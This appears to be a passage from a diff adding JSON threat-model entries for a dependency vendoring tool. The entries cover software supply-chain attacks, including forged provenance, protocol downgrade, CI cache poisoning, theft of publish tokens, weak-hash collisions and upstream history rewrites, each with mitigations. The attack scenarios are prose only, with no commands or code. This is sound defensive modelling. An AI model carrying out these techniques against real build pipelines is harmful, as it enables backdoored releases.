+    "example": "A malicious post-install hook from a compromised dev dependency modifies the vendoring tool's metadata files, replacing the recorded hash for a security-critical vendored library with the hash of a backdoored version it also writes to the vendor directory.  The next dependency check reports all dependencies as up-to-date.",
+    "references": "https://capec.mitre.org/data/definitions/17.html, https://cwe.mitre.org/data/definitions/494.html"
+  },
+  {
+    "SID": "DFT-25",
+    "target": [
+      "Datastore"
+    ],
+    "description": "Forged or unverifiable provenance attestation conceals malicious build output",
+    "details": "Build pipelines and package registries increasingly publish provenance attestations (SLSA provenance, Sigstore signatures, CycloneDX SBOMs) to allow consumers to verify what was built and how.  If an attacker controls the build environment or a privileged step in the release pipeline, they can generate and publish a plausible-looking attestation that describes a clean build while the actual artifact contains malicious code.  Consumers who do not independently verify attestation authenticity - or for whom verification tooling is not available - cannot distinguish the forged attestation from a legitimate one.",
+    "Likelihood Of Attack": "Low",
+    "severity": "High",
+    "condition": "target.controls.usesCodeSigning is False and target.hasWriteAccess is True and target.storesSensitiveData is False and target.controls.providesIntegrity is False",
+    "prerequisites": "The attacker has write access to the artifact store or can inject a step into the release pipeline.  Consumers do not independently verify attestation signatures against a transparency log.  The attestation format does not bind the attestation cryptographically to a build environment that the consumer can audit independently.",
+    "mitigations": "Sign all provenance attestations with a key whose public component is published to an append-only transparency log (e.g. Sigstore Rekor).  Enforce that consumers verify attestation signatures before installing.  Require SLSA Build Level 2+ provenance so the build environment itself is attested.  Separate the attestation-generation step from the code-producing step and use a dedicated signing identity with narrow write scope.",
+    "example": "An attacker who compromises the release pipeline injects a backdoor into the published wheel before it is signed.  They also generate a CycloneDX SBOM that describes the clean, unmodified source - using the same attestation action - and publish both together on the registry.  A consumer who reviews the SBOM component list sees nothing suspicious, because the SBOM was generated from the declared source manifest after the backdoor was already inserted.",
+    "references": "https://slsa.dev/spec/v1.0/threats#e-build-process, https://slsa.dev/spec/v1.0/threats#f-artifact-publication, https://capec.mitre.org/data/definitions/39.html, https://cwe.mitre.org/data/definitions/345.html"
+  },
+  {
+    "SID": "DFT-26",
+    "target": [
+      "Process"
+    ],
+    "description": "Protocol or transport downgrade forces connection over insecure channel",
+    "details": "VCS clients and HTTP libraries implement protocol negotiation that can be exploited by a network-adjacent attacker.  By blocking or corrupting TLS or SSH handshakes, the attacker causes the client to fall back to a weaker, unencrypted protocol - HTTP instead of HTTPS, plain SVN instead of svn+https://, or git:// instead of SSH.  The downgraded connection exposes the full content of the dependency fetch to interception and substitution.  Applications that do not explicitly reject protocol-downgrade responses - by enforcing a minimum acceptable protocol in their configuration - are silently redirected to the insecure channel.",
+    "Likelihood Of Attack": "Low",
+    "severity": "High",
+    "condition": "target.controls.isHardened is False and target.controls.providesIntegrity is False and target.controls.invokesSubprocess is True",
+    "prerequisites": "The VCS client or HTTP library performs protocol negotiation and has a plaintext fallback enabled.  The attacker is network-adjacent and can block or corrupt TLS or SSH handshake packets.  The application configuration does not enforce a minimum acceptable protocol or reject plaintext-fallback connections.",
+    "mitigations": "Configure VCS clients and HTTP libraries to disable plaintext fallback explicitly.  Enforce HTTPS-only or SSH-only in the tool's manifest schema by rejecting non-TLS URL schemes at parse time.  Use HSTS-preloaded hosts where available.  Monitor outbound connection logs for unexpected protocol changes.",
+    "example": "An attacker on the same network segment as a CI runner blocks the TLS handshake to a self-hosted SVN server.  The SVN client falls back to the plain svn:// protocol.  Because the manifest URL uses svn+https:// but the client accepts the downgraded connection, the attacker injects a malicious payload into the unencrypted SVN response.",
+    "references": "https://capec.mitre.org/data/definitions/220.html, https://cwe.mitre.org/data/definitions/757.html"
+  },
+  {
+    "SID": "DFT-27",
+    "target": [
+      "Process"
+    ],
+    "description": "Build or release triggered from unofficial source fork or unprotected branch",
+    "details": "An attacker who can influence CI/CD trigger parameters - through a misconfigured release workflow, an impersonated webhook, or a push to an unprotected branch that triggers publishing - causes the build to consume source from an unofficial fork or experimental branch rather than the protected default branch.  The artifact produced is indistinguishable from a legitimate build and may be signed with the project's own publish credential if the build environment does not validate the source ref.  SLSA calls this category 'external build parameters' (threat D): even when a trusted build platform is used, the inputs that feed into it must be verified.",
+    "Likelihood Of Attack": "Low",
+    "severity": "High",
+    "condition": "target.controls.isHardened is False and target.controls.isCiPipeline is True",
+    "prerequisites": "The release workflow accepts the source repository or branch as an external parameter rather than hardcoding it, or branch protection does not cover all refs that trigger publishing.  The attacker can create a fork or push to an unprotected branch.",
+    "mitigations": "Hardcode the source repository and branch in the release workflow - do not accept them as external parameters.  Restrict release triggers to tags pushed to the protected default branch only.  Record the exact source ref in provenance attestation and verify it against a declared allowlist of trusted refs before publishing.  Aim for SLSA Build Level 3 so the build platform is the authority on what was built.",
+    "example": "A release workflow fires on any pushed tag.  An attacker with repository write access pushes a tag on a non-default branch containing a backdoor.  The workflow builds and signs the artifact; the attestation records the correct repository but the wrong branch, which no automated consumer check catches.",
+    "references": "https://slsa.dev/spec/v1.0/threats#d-external-build-parameters, https://capec.mitre.org/data/definitions/186.html, https://cwe.mitre.org/data/definitions/494.html"
+  },
+  {
+    "SID": "DFT-28",
+    "target": [
+      "Datastore"
+    ],
+    "description": "CI/CD build cache poisoned to silently substitute a malicious compiled artifact",
+    "details": "CI/CD platforms share build caches across pipeline runs to reduce build times.  If a less-privileged workflow (e.g. a pull-request build triggered from a fork) can write to a cache key that a subsequent privileged workflow (e.g. a release build) will restore, an attacker controls what the release build receives without touching the source code.  The restored cache entry bypasses all source-level security controls: no rebuild from source, no compile-time analysis, and no provenance check.  SLSA identifies this as threat E6 ('poison the build cache').",
+    "Likelihood Of Attack": "Low",
+    "severity": "High",
+    "condition": "target.controls.isHardened is False and target.hasWriteAccess is True and target.storesSensitiveData is False",
+    "prerequisites": "The CI/CD platform shares a cache namespace between pull-request and release builds.  Cache keys are predictable and writable by a fork-triggered workflow.  Restored cache entries are consumed without re-verifying their integrity against build-input hashes.",
+    "mitigations": "Use separate, namespace-isolated caches for pull-request and release builds.  Derive cache keys from a cryptographic hash of all build inputs so any changed input invalidates the entry.  For release builds, disable cache restoration entirely and build from clean state.  Apply SLSA Build Level 3 isolation so each build runs in a fresh, unshared environment.",
+    "example": "A fork's malicious CI step writes a backdoored compiled extension to the shared GitHub Actions cache under the key the next release build will restore.  The release build restores the poisoned entry, packages the backdoored extension into the wheel, and publishes it - without the substitution appearing in any source diff.",
+    "references": "https://slsa.dev/spec/v1.0/threats#e-build-process, https://capec.mitre.org/data/definitions/17.html, https://cwe.mitre.org/data/definitions/494.html"
+  },
+  {
+    "SID": "DFT-29",
+    "target": [
+      "Process"
+    ],
+    "description": "Signing key or short-lived publish credential exfiltrated from build environment",
+    "details": "The release build environment holds short-lived credentials that grant the right to publish under the project's identity: OIDC tokens, signing private keys, or scoped API tokens.  An attacker who can execute code in that environment - through a compromised dependency installed without hash pinning, a malicious step injected via a pull-request workflow misconfiguration, or a backdoored CI action - can read and exfiltrate these credentials.  Armed with a valid publish token the attacker can upload a backdoored artifact through the expected registry path, completely outside the project's CI/CD pipeline.  SLSA identifies this as threat E5 ('steal cryptographic secrets').",
+    "Likelihood Of Attack": "Low",
+    "severity": "Very High",
+    "condition": "target.controls.isHardened is False and target.controls.isCiPipeline is True",
+    "prerequisites": "A credential with publish rights is present in the build environment.  The build and publish steps are not fully isolated: code running in the build step can read the credential used by the publish step.  Egress from the build environment is not blocked, allowing the credential to be transmitted to an attacker-controlled endpoint.",
+    "mitigations": "Restrict publish credentials to a dedicated deployment environment that requires an explicit approval gate before execution.  Use OIDC-based short-lived credentials (not long-lived API tokens) to limit the window of exploitation.  Block all non-allowlisted egress from the build environment so credential exfiltration channels are closed.  Require mandatory second-approver review before the deployment environment is unlocked.",
+    "example": "A compromised third-party CI action that was not updated to a newer SHA reads the OIDC token from the runner environment and POSTs it to an attacker-controlled endpoint.  The attacker uses the token to publish a backdoored package to PyPI under the project's trusted publisher identity before the token's five-minute expiry.",
+    "references": "https://slsa.dev/spec/v1.0/threats#e-build-process, https://capec.mitre.org/data/definitions/560.html, https://cwe.mitre.org/data/definitions/522.html"
+  },
+  {
+    "SID": "DFT-30",
+    "target": [
+      "Process"
+    ],
+    "description": "Weak or deprecated hash algorithm allows collision-based integrity bypass",
+    "details": "Integrity verification systems that accept MD5 or SHA-1 digests are vulnerable to practical collision attacks.  An attacker who can craft a malicious archive whose digest matches a declared hash passes verification while delivering different content.  Even for currently unbroken algorithms, a manifest that permits weak algorithm prefixes provides a false sense of security: a user who copy-pastes an MD5 checksum from a legacy download page believes their dependency is verified when it is not.  SLSA identifies this as threat M2 ('exploit cryptographic hash collisions') and requires verification using secure hash algorithms.",
+    "Likelihood Of Attack": "Low",
+    "severity": "High",
+    "condition": "target.controls.providesIntegrity is True and target.controls.hashVerification is True",
+    "prerequisites": "The manifest schema permits weak hash algorithm prefixes (e.g. md5:, sha1:) in the integrity.hash field.  A user has added a weak hash to a manifest entry.  An attacker can influence the content served for that dependency.",
+    "mitigations": "Reject MD5 and SHA-1 prefixes at schema validation time, accepting only sha256:, sha384:, and sha512:.  Document clearly that only these algorithms are acceptable.  Review minimum acceptable algorithms against NIST SP 800-131A guidance as cryptographic recommendations evolve.",
+    "example": "A developer adds an integrity hash using SHA-1 (sha1:<hex>) because the upstream's download page only lists an MD5 and a SHA-1 checksum.  An attacker who controls the archive server crafts a collision and substitutes a backdoored archive that produces the same SHA-1 digest, passing dfetch's integrity check.",
+    "references": "https://slsa.dev/spec/v1.0/threats#m-verification, https://capec.mitre.org/data/definitions/459.html, https://cwe.mitre.org/data/definitions/328.html, https://csrc.nist.gov/publications/detail/sp/800-131a/rev-2/final"
+  },
+  {
+    "SID": "DFT-31",
+    "target": [
+      "Dataflow"
+    ],
+    "description": "Upstream source publishes no SLSA Source provenance attestation — consumer cannot verify upstream security controls",
+    "details": "Source provenance attestations and Verification Summary Attestations (VSAs) allow consumers to verify that a specific revision of an upstream repository was created under a defined set of source-level controls.  When a dependency management tool fetches VCS content without checking for such attestations, there is no cryptographic evidence that any minimum controls were applied: branch protection, mandatory review, immutable history, or ancestry enforcement may all be absent.  The consumer is forced to rely on the reputation of the upstream host alone rather than verifiable, tamper-resistant policy.  SLSA Source Level 2+ requires repositories to generate Source Provenance Attestations contemporaneously with branch updates; without tooling to fetch and verify these attestations the consumer has no auditable chain to inspect.",
+    "Likelihood Of Attack": "Medium",
+    "severity": "Medium",
+    "condition": "target.controls.providesIntegrity is False and target.controls.usesCodeSigning is False and target.controls.isNetworkFlow is True",
+    "prerequisites": "The upstream VCS host does not publish SLSA Source Provenance Attestations or VSAs for the fetched revision.  The consuming tool has no manifest field to declare the expected SLSA source level and no mechanism to fetch or verify upstream source attestations.  The consuming project has no policy requiring a minimum upstream SLSA source level.",
+    "mitigations": "Prefer upstream projects that publish SLSA Source Level 2+ VSAs or Source Provenance Attestations.  Add a declarative field to the dependency manifest allowing authors to record the minimum acceptable SLSA source level for each dependency.  Implement tooling to fetch and verify upstream VSAs against a transparency log during dependency update operations.  Until such tooling exists, manually audit the upstream repository's branch-protection and review settings before accepting a new dependency.",
+    "example": "A project declares a Git dependency pinned to a commit SHA on a public GitHub repository.  The upstream has no branch protection, no mandatory review, and no source provenance attestations.  A single maintainer introduces a backdoor in a direct commit.  The consumer has no attestation to inspect that would reveal the absence of review — the SHA and TLS transport are intact, but they provide no assurance about the upstream development process.",
+    "references": "https://slsa.dev/spec/v1.2/source-requirements, https://slsa.dev/spec/v1.0/threats#a-producer"
+  },
+  {
+    "SID": "DFT-32",
+    "target": [
+      "Datastore"
+    ],
+    "description": "Upstream source enforces no mandatory two-party review — single contributor can introduce changes without independent verification",
+    "details": "SLSA Source Level 4 requires every change to a protected branch to be approved by two trusted individuals before merge.  An upstream project that enforces no mandatory code review presents an elevated risk even when no account is compromised and no maintainer is acting maliciously: a single mistake, a coerced change, or an unreviewed commit bypasses independent verification by design.  This is structurally distinct from DFT-11 (account compromise enabling unauthorised merge) and DFT-19 (intentional maintainer sabotage) — no attack is required.  The absence of two-party review as a technical control means there is no second person whose approval would have caught the change.",
+    "Likelihood Of Attack": "Medium",
+    "severity": "Medium",
+    "condition": "target.storesSensitiveData is True and target.hasWriteAccess is True and target.controls.hasAccessControl is False",
+    "prerequisites": "The upstream repository does not enforce mandatory two-party code review on its protected branches.  Any contributor with push or merge rights can introduce changes without a second reviewer approving.  The consuming project fetches from this repository and uses the vendored content as a build input.",
+    "mitigations": "Prefer upstream projects that enforce mandatory code review and publish SLSA Source Level 4 VSAs.  For high-risk dependencies, require explicit human review of every upstream commit before advancing the pin — irrespective of whether the upstream enforces review internally.  Document the upstream's code-review posture and SLSA source level in the project's risk register alongside the dependency entry.",
+    "example": "A project depends on a utility library maintained by a single developer who merges all contributions without requiring a second reviewer.  A coerced commit introduces a subtle timing side-channel that leaks build-environment environment variables at runtime.  Commit-SHA pinning, transport security, and integrity hashes all pass — the absence of independent review is the sole missed control.",
+    "references": "https://slsa.dev/spec/v1.2/source-requirements#level-4, https://slsa.dev/spec/v1.0/threats#a-producer, https://capec.mitre.org/data/definitions/186.html"
+  },
+  {
+    "SID": "DFT-33",
+    "target": [
+      "Dataflow"
+    ],
+    "description": "Upstream default-branch history rewritten — ancestry broken, pinned SHA orphaned or made unreachable",
+    "details": "DFT-05 and DFT-21 cover mutable references (branch or tag) silently force-pushed to a new commit.  DFT-33 addresses a distinct scenario: the entire default-branch history is rewritten via interactive rebase, filter-branch, or a force-push to the protected default branch itself, breaking the immutable revision lineage that SLSA Source Level 2 requires.  A consumer who pinned to a previously-audited commit SHA may find that SHA orphaned — present in the object database but no longer reachable from any branch tip — or absent entirely after a garbage-collection pass.  The SHA remains cryptographically valid, but the surrounding history that justified the original review decision is severed.  Most vendoring tools have no mechanism to verify that a pinned SHA remains reachable in the upstream's default branch after a fetch.",
+    "Likelihood Of Attack": "Low",
+    "severity": "Medium",
+    "condition": "target.controls.isHardened is False and target.controls.providesIntegrity is False and target.controls.isNetworkFlow is True",
+    "prerequisites": "The upstream repository does not enforce ancestry protection on its default branch — force-pushes to main are permitted.  An attacker with repository write access, or a maintainer acting intentionally, rewrites the branch history.  The consuming project has previously pinned to a commit SHA from the original history; that SHA becomes unreachable after the rewrite.",
+    "mitigations": "Pin VCS dependencies to immutable commit SHAs and, after each fetch, verify that the pinned SHA is reachable from the upstream's current default branch tip.  Prefer upstream repositories that enforce SLSA Source Level 2+ ancestry protection (no force-push policy on protected branches).  Use Source Provenance Attestations that include lineage records for additional assurance.  Monitor upstream repositories for unexpected history rewrites as part of regular dependency hygiene.",
+    "example": "A project pins a dependency to commit abc123, which was reviewed before acceptance.  The upstream maintainer later performs a history rewrite to strip accidentally committed secrets, producing new commit hashes throughout the tree.  The original abc123 becomes an orphan — not reachable from main.  A fresh clone no longer contains abc123, making it impossible to verify the relationship between the pinned commit and the current release branch, and silently breaking any reproducibility check.",
+    "references": "https://slsa.dev/spec/v1.2/source-requirements#level-2, https://capec.mitre.org/data/definitions/690.html, https://cwe.mitre.org/data/definitions/345.html"
+  }
+]
